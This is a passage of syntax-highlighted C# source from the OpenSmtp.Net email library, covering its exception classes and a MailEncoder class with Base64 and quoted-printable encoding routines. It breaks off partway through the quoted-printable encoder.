</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc5">readonly</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">Version</span><span class="sc0">       </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"OpenSmtp.net version 01.11.0"</span><span class="sc10">;</span><span class="sc0">
        
        </span><span class="sc15">///&lt;value&gt;Mailer header added to each message sent&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0">  </span><span class="sc11">X_MAILER_HEADER</span><span class="sc0">     </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"X-Mailer: OpenSmtp.net"</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc5">namespace</span><span class="sc0"> </span><span class="sc11">OpenSmtp</span><span class="sc10">.</span><span class="sc11">Mail</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

</span><span class="sc3">/******************************************************************************
    Copyright 2001-2005 Ian Stallings
    OpenSmtp.Net is free software; you can redistribute it and/or modify
    it under the terms of the Lesser GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    OpenSmtp.Net is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    Lesser GNU General Public License for more details.

    You should have received a copy of the Lesser GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
/*******************************************************************************/</span><span class="sc0">

</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc15">/// &lt;summary&gt;
</span><span class="sc0">    </span><span class="sc15">/// This is a System.Exception class for handling exceptions in 
</span><span class="sc0">    </span><span class="sc15">/// MIME Parsing operations.
</span><span class="sc0">    </span><span class="sc15">/// &lt;/summary&gt;
</span><span class="sc0">    </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">ParseException</span><span class="sc10">:</span><span class="sc11">ApplicationException</span><span class="sc0"> 
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">ParseException</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">String</span><span class="sc0"> </span><span class="sc11">message</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">base</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">message</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{}</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">ParseException</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">String</span><span class="sc0"> </span><span class="sc11">message</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Exception</span><span class="sc0"> </span><span class="sc11">inner</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">base</span><span class="sc10">(</span><span class="sc11">message</span><span class="sc10">,</span><span class="sc11">inner</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{}</span><span class="sc0">   
    </span><span class="sc10">}</span><span class="sc0">

</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc5">namespace</span><span class="sc0"> </span><span class="sc11">OpenSmtp</span><span class="sc10">.</span><span class="sc11">Mail</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

</span><span class="sc3">/******************************************************************************
    Copyright 2001-2005 Ian Stallings
    OpenSmtp.Net is free software; you can redistribute it and/or modify
    it under the terms of the Lesser GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    OpenSmtp.Net is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    Lesser GNU General Public License for more details.

    You should have received a copy of the Lesser GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
/*******************************************************************************/</span><span class="sc0">


</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc15">/// &lt;summary&gt;
</span><span class="sc0">    </span><span class="sc15">/// This is a System.Exception class for handling exceptions in 
</span><span class="sc0">    </span><span class="sc15">/// SMTP operations.
</span><span class="sc0">    </span><span class="sc15">/// &lt;/summary&gt;
</span><span class="sc0">    </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">SmtpException</span><span class="sc10">:</span><span class="sc11">ApplicationException</span><span class="sc0"> 
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">SmtpException</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">String</span><span class="sc0"> </span><span class="sc11">message</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">base</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">message</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{}</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">SmtpException</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">String</span><span class="sc0"> </span><span class="sc11">message</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Exception</span><span class="sc0"> </span><span class="sc11">inner</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">base</span><span class="sc10">(</span><span class="sc11">message</span><span class="sc10">,</span><span class="sc11">inner</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{}</span><span class="sc0">   
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc5">namespace</span><span class="sc0"> </span><span class="sc11">OpenSmtp</span><span class="sc10">.</span><span class="sc11">Mail</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">

</span><span class="sc3">/******************************************************************************
    Copyright 2001-2005 Ian Stallings
    OpenSmtp.Net is free software; you can redistribute it and/or modify
    it under the terms of the Lesser GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    OpenSmtp.Net is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    Lesser GNU General Public License for more details.

    You should have received a copy of the Lesser GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
/*******************************************************************************/</span><span class="sc0">

</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Security</span><span class="sc10">.</span><span class="sc11">Cryptography</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Globalization</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Text</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc15">/// &lt;summary&gt;
</span><span class="sc0">    </span><span class="sc15">/// This Type is used to encode and decode files and strings using 
</span><span class="sc0">    </span><span class="sc15">/// MIME compatible encoding methods such as Base64 and quoted-printable
</span><span class="sc0">    </span><span class="sc15">/// &lt;/summary&gt;
</span><span class="sc0">    </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">MailEncoder</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc11">MailEncoder</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{}</span><span class="sc0">
        </span><span class="sc15">/// &lt;summary&gt;Encodes a String using Base64 (see RFC 1521)&lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="s"&gt;string to be encoded&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;code&gt;
</span><span class="sc0">        </span><span class="sc15">/// string base64EncodedText = MailEncoder.ConvertQP("??");
</span><span class="sc0">        </span><span class="sc15">/// &lt;/code&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;returns&gt;Base64 encoded string&lt;/returns&gt;
</span><span class="sc0">        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">ConvertToBase64</span><span class="sc10">(</span><span class="sc11">String</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">from</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Encoding</span><span class="sc10">.</span><span class="sc11">ASCII</span><span class="sc10">.</span><span class="sc11">GetBytes</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">.</span><span class="sc11">ToCharArray</span><span class="sc10">());</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">returnMsg</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToBase64String</span><span class="sc10">(</span><span class="sc11">from</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">returnMsg</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        

        </span><span class="sc15">/// &lt;summary&gt; Encodes a FileStream using Base64 (see RFC 1521)&lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="inputFilePath"&gt;UNC path to file that needs to be encoded&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="outputFilePath"&gt;UNC path to file will store Base64 encoded ASCII text&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;code&gt;
</span><span class="sc0">        </span><span class="sc15">/// MailEncoder.ConvertBase64("file.jpg", "file.txt");
</span><span class="sc0">        </span><span class="sc15">/// &lt;/code&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">ConvertToBase64</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">inputFilePath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">outputFilePath</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">//Create the file streams to handle the input and output files.
</span><span class="sc0">            </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">fin</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">inputFilePath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">Open</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileAccess</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">ConvertToBase64</span><span class="sc10">(</span><span class="sc11">fin</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outputFilePath</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fin</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;summary&gt; Encodes a FileStream using Base64 (see RFC 1521)&lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="inputStream"&gt;The stream that needs to be encoded&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="outputFilePath"&gt;UNC path to file will store Base64 encoded ASCII text&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;code&gt;
</span><span class="sc0">        </span><span class="sc15">/// MailEncoder.ConvertBase64(Stream, "file.txt");
</span><span class="sc0">        </span><span class="sc15">/// &lt;/code&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">ConvertToBase64</span><span class="sc10">(</span><span class="sc11">Stream</span><span class="sc0"> </span><span class="sc11">inputStream</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">outputFilePath</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">//Create the file streams to handle the input and output files.
</span><span class="sc0">            </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">fout</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">outputFilePath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">OpenOrCreate</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileAccess</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fout</span><span class="sc10">.</span><span class="sc11">SetLength</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc11">ToBase64Transform</span><span class="sc0"> </span><span class="sc11">transformer</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">ToBase64Transform</span><span class="sc10">();</span><span class="sc0">

            </span><span class="sc2">//Create variables to help with read and write below.
</span><span class="sc0">            </span><span class="sc2">//This is intermediate storage for the encryption:
</span><span class="sc0">            </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">byte</span><span class="sc10">[</span><span class="sc11">inputStream</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc11">transformer</span><span class="sc10">.</span><span class="sc11">InputBlockSize</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">transformer</span><span class="sc10">.</span><span class="sc11">OutputBlockSize</span><span class="sc10">];</span><span class="sc0"> 
            </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">rdlen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">              </span><span class="sc2">//This is the total number of bytes written.
</span><span class="sc0">            </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">totlen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">inputStream</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0">    </span><span class="sc2">//This is the total length of the input file.
</span><span class="sc0">            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">;</span><span class="sc0">                     </span><span class="sc2">//This is the number of bytes to be written at a time.
</span><span class="sc0">
            </span><span class="sc11">CryptoStream</span><span class="sc0"> </span><span class="sc11">encStream</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">CryptoStream</span><span class="sc10">(</span><span class="sc11">fout</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">transformer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CryptoStreamMode</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc2">//Read from the input file, then encrypt and write to the output file.
</span><span class="sc0">            </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">rdlen</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">totlen</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">len</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">inputStream</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">bin</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">inputStream</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">encStream</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">bin</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc2">//inputBlock size(3)
</span><span class="sc0">                </span><span class="sc11">rdlen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rdlen</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">len</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc11">transformer</span><span class="sc10">.</span><span class="sc11">InputBlockSize</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">transformer</span><span class="sc10">.</span><span class="sc11">OutputBlockSize</span><span class="sc10">));</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc11">encStream</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">fout</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">ConvertFromBase64</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">ret</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">FromBase64String</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">Encoding</span><span class="sc10">.</span><span class="sc11">ASCII</span><span class="sc10">.</span><span class="sc11">GetString</span><span class="sc10">(</span><span class="sc11">ret</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ret</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">ConvertFromBase64</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">inputFilePath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">outputFilePath</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">//Create the file streams to handle the input and output files.
</span><span class="sc0">            </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">fin</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">inputFilePath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">Open</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileAccess</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">fout</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">outputFilePath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">OpenOrCreate</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileAccess</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fout</span><span class="sc10">.</span><span class="sc11">SetLength</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc11">FromBase64Transform</span><span class="sc0"> </span><span class="sc11">transformer</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FromBase64Transform</span><span class="sc10">();</span><span class="sc0">

            </span><span class="sc2">//Create variables to help with read and write below.
</span><span class="sc0">            </span><span class="sc2">//This is intermediate storage for the decryption:
</span><span class="sc0">            </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">byte</span><span class="sc10">[</span><span class="sc11">fin</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc11">transformer</span><span class="sc10">.</span><span class="sc11">InputBlockSize</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">transformer</span><span class="sc10">.</span><span class="sc11">OutputBlockSize</span><span class="sc10">];</span><span class="sc0"> 
            </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">rdlen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">              </span><span class="sc2">//This is the total number of bytes written.
</span><span class="sc0">            </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">totlen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fin</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0">    </span><span class="sc2">//This is the total length of the input file.
</span><span class="sc0">            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">;</span><span class="sc0">                     </span><span class="sc2">//This is the number of bytes to be written at a time.
</span><span class="sc0">
            </span><span class="sc11">CryptoStream</span><span class="sc0"> </span><span class="sc11">encStream</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">CryptoStream</span><span class="sc10">(</span><span class="sc11">fout</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">transformer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CryptoStreamMode</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc2">//Read from the input file, then decrypt and write to the output file.
</span><span class="sc0">            </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">rdlen</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">totlen</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">len</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fin</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">bin</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">fin</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">encStream</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">bin</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">rdlen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rdlen</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">len</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc11">transformer</span><span class="sc10">.</span><span class="sc11">InputBlockSize</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">transformer</span><span class="sc10">.</span><span class="sc11">OutputBlockSize</span><span class="sc10">));</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc11">encStream</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">fout</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">fin</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
            
        </span><span class="sc15">/// &lt;summary&gt; Encodes a string using Quoted-Printable encoding (see RFC 1521)&lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="s"&gt;string that needs to be encoded&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="charset"&gt;charset of string that needs to be encoded&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;code&gt;
</span><span class="sc0">        </span><span class="sc15">/// string qpEncodedText = MailEncoder.ConvertQP("??");
</span><span class="sc0">        </span><span class="sc15">/// &lt;/code&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;returns&gt;Quoted-Printable encoded string&lt;/returns&gt;
</span><span class="sc0">        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">ConvertToQP</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">charset</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">// TURNER.BSD MODIFIED 9/10/2004 GKW to fix NUMEROUS bugs
</span><span class="sc0">            </span><span class="sc2">// Conforms to rules described in http://www.fourmilab.ch/webtools/qprint/rfc1521.html
</span><span class="sc0">        
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">;}</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">charset</span><span class="sc10">==</span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">charset</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"ISO-8859-1"</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// default charset
</span><span class="sc0">            
            </span><span class="sc2">// environment newline char
</span><span class="sc0">            </span><span class="sc16">char</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">nl</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">NewLine</span><span class="sc10">.</span><span class="sc11">ToCharArray</span><span class="sc10">();</span><span class="sc0">          

            </span><span class="sc2">// source char array
